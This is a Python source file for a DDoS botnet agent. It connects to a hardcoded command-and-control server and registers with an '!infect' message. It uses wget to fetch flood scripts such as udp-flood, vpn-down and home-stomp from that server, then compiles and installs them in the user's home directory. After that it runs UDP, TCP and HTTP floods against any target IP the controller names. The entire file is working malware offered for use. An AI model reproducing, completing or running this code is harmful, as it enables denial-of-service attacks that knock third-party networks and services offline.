import socket 
import os
import pwd 
import time
import threading

global sock 
global host, access_port 
host, access_port = "192.168.1.96", 9999

class sock_tcp(object):

    def __init__(self) -> None:

        self.host = host
        self.port = access_port

    def getConnectedSocket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((self.host, self.port))
            return sock
        except Exception as e:
            return False
    

class Installation(object):

    def __init__(self, host: str, access_port: int, schema: str) -> None:

        self.os = os.name == "nt" and "win" or "linux"
        self.machine_name = pwd.getpwuid(os.getuid())[0]
        self.path = self.os == "linux" and f"/home/{self.machine_name}/" or "/"
        self.host = host 
        self.port = access_port
        self.schema = schema 

        if self.os == "linux":
            self.methods_name = "mls"
        else:
            self.methods_name = "wdbs"  

    def methods(self): return [f"{self.schema}{self.host}:{self.port}/scripts/mix.py",f"{self.schema}{self.host}:{self.port}/scripts/udp-bypass.pl",f"{self.schema}{self.host}:{self.port}/scripts/vpn-down.pl",f"{self.schema}{self.host}:{self.port}/scripts/udp-flood.pl",f"{self.schema}{self.host}:{self.port}/scripts/home-freeze",f"{self.schema}{self.host}:{self.port}/scripts/http",f"{self.schema}{self.host}:{self.port}/scripts/home-stomp"]   
    
    def installed_methods(self) -> bool:
        return os.path.isdir(self.path + self.methods_name) == None

    def installMethods(self) -> bool:

        if not os.path.isdir(self.path + self.methods_name):
            try:               
                os.mkdir(self.path + self.methods_name)
            except Exception as e:
                print("Failed making directory")
                return False 

            try:   
                cmd = f"cd {self.path}{self.methods_name} "
                for i in self.methods():
                    print(i)
                    filename = i.split('/')[4]
                    print(filename)
                    fileType = '.' in filename and filename.split('.')[1] or None

                    if fileType == 'c':
                        cmd += f"&& wget {i} -O {filename} && gcc -pthread {filename} -o {filename.split('.')[0]} && rm {filename} "
                    elif fileType == 'go':
                        cmd += f"&& wget {i} -O {filename} && go build {filename} && rm {filename} "
                    elif fileType == None:
                        cmd += f"&& wget {i} -O {filename} && chmod +x {filename} "
                    else:
                        cmd += f"&& wget {i} -O {filename} "
                        
                os.system(cmd)
                return True 
            except Exception as e:
                print("failed to mkdir install methods " + str(e))


class Listener(object):

    def __init__(self, socket: socket.socket, methods_path) -> None:
        self.sock = socket 
        self.methods = ["udp-flood", "mix", "http-flood", "http-spam", "tcp-flood", "udp-rand", "udp-bypass", "home-freeze", "tcp-http", "vpn-down", "home-stomp", "stop"]
        self.st = {"udp-flood": ["perl", "udp-flood.pl"], "mix": ["python3", "mix.py"], "http-flood": ["./", "http"], "http-spam": ["./", "httpsp"], "tcp-flood": ["python3", "mix.py"], "udp-rand": "perl", "udp-bypass": ["perl", "udp-bypass.pl"], "home-freeze": ["./", "tch"], "tcp-http": ["python3", "mix.py"], "vpn-down": ["perl", "vpn-down.pl"], "home-stomp": ["./","home-stomp"]}
        self.commands = ["attack", "run_command"]
        self.buffer = 1024
        self.max_time = 4000
        self.socket_reconnect_time = 15 
        self.prefix = '!'
        self.methods_path = methods_path

        try:
            sock.send(str.encode(f"{self.prefix}infect"))
        except AttributeError:
            print("Failure creating socket and infecting self.")
            time.sleep(5)
            os._exit(1)
        except Exception as e:
            print(f"Unknown err occured, info -> {str(e)})")

    def verify_args(self, ip: str, port: int, psize: int, time: int) -> bool:
        try:
            socket.gethostbyname(ip)
            return (
                port > 0 and port < 65535 and psize > 100 and psize <= 1024 and time <= self.max_time
            )
        except:
            return False 
    def start_listening(self):
        thr = threading.Thread(target=self.on_received)
        thr.start()

    def handle_command(self, command):
        print('Handler, handling ' + command)
        print(command)
        spl = command.split(' ')
        prefix = spl[0].lower()
        
        if prefix == "attack":

            ip = ""
            port = -1 
            psize = -1
            time = -1 

            method = spl[len(spl) - 1]

            if not method.lower() in self.methods:
                print("invalid method")
                return 
            run_inf = method != "stop" and self.st[method]
            print(method)
            try:
                if method == "udp-flood":
                    if len(spl) != 6:
                        return 

                    ip = spl[1]
                    port = spl[2]
                    psize = spl[3]
                    time = spl[4]

                    if self.verify_args(ip, int(port), int(psize), int(time)):
                        os.system(f"cd {self.methods_path} && {run_inf[0]} {run_inf[1]} {ip} {port} {psize} {time}")
                        print("Attack running.")
                    else:
                        return
                elif method == "tcp-http":
                    if len(spl) != 8:
                        print("bad len")
                        return 

                    ip = spl[1]
                    port = spl[2]
                    time = spl[3]
                    protocol = spl[4]
                    layer = spl[5]
                    threads = spl[6]
                    
                    if not protocol.upper() in ["UDP","TCP"] or not int(layer) in [4,7] or int(threads) < 1 or int(threads) > 400:
                        return
                    if self.verify_args(ip, int(port), 1024, int(time)):
                        os.system(f"cd {self.methods_path} && {run_inf[0]} {run_inf[1]} -ip {ip} -port {port} -time {time} -protocol {protocol} -osilayer {layer} -threads {threads}")
                elif method == "udp-bypass":
                    if len(spl) != 8:
                        return
                    
                    rpc = spl[1]
                    threads = spl[2]
                    ip = spl[3]
                    port = spl[4]
                    psize = spl[5]
                    time = spl[6]

                    if int(rpc) < 1 or int(rpc) > 10 or int(threads) < 1 or int(threads) > 5:
                        return 
                    if self.verify_args(ip, int(port), int(psize), int(time)):
                        os.system(f"cd {self.methods_path} && {run_inf[0]} {run_inf[1]} {rpc} {threads} {ip} {port} {time}")
                elif method == "vpn-down":
                    if len(spl) != 7:
                        return 

                    tc = spl[1]
                    ip = spl[2]
                    port = spl[3]
                    psize = spl[4]
                    time = spl[5]

                    if int(tc) < 1 or int(tc) > 5:
                        return 
                    if self.verify_args(ip, int(port), int(psize), int(time)):
                        os.system(f"cd {self.methods_path} && {run_inf[0]} {run_inf[1]} {tc} {ip} {port} {psize} {time}")

                elif method == "home-stomp":
                    if len(spl) != 8:
                        return
                    ip = spl[1]
                    port = spl[2]
                    psize = spl[3]
                    time = spl[4]
                    threads = spl[5]
                    rpc = spl[6]

                    if int(threads) < 1 or int(threads) > 5 or int(rpc) < 1 or int(rpc) > 25:
                        return 

                    if self.verify_args(ip, int(port), int(psize) , int(time)):
                        os.system(f"cd {self.methods_path} && {run_inf[0]} {run_inf[1]} {ip} {port} {psize} {time} {threads} {rpc}")
                elif method == "stop":
                    if len(spl) != 3:
                        return
                    try:
                        ip = spl[1]
                        if socket.gethostbyaddr(ip):
                            os.system(f"pkill -f \"{ip}\"")
                            print("stopped attack")
                    except:
                        return
            except:
                return 


    def on_received(self):
        while True:
            try:
                data = self.sock.recv(self.buffer).decode().lower()
                if data is not None and data[0] == self.prefix:
                    self.handle_command(data.replace(data[0], ''))
                else:
                    print(f"unrecognised command {data}")
            except IndexError:
                print("Attempting to reconnect.")
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    sock.connect((host, access_port))
                    sock.send(str.encode("!infect"))
                    self.sock = sock 
                    print("Reconnected.")
                except Exception as e:
                    print(f"Sleeping for {self.socket_reconnect_time} seconds then reconnecting")
                    time.sleep(self.socket_reconnect_time)
            except:
                print("Exception thrown")
                time.sleep(self.socket_reconnect_time)
def main():

    global sock 

    inst = Installation(host, 9485, "http://")
    sock_obj = sock_tcp()

    if not inst.installed_methods():
        inst.installMethods()
    
    sock = sock_obj.getConnectedSocket()
    listen_obj = Listener(sock, f"{inst.path}{inst.methods_name}")
    listen_obj.start_listening()
    

    print("Installed methods")

if __name__ == "__main__":
    main()
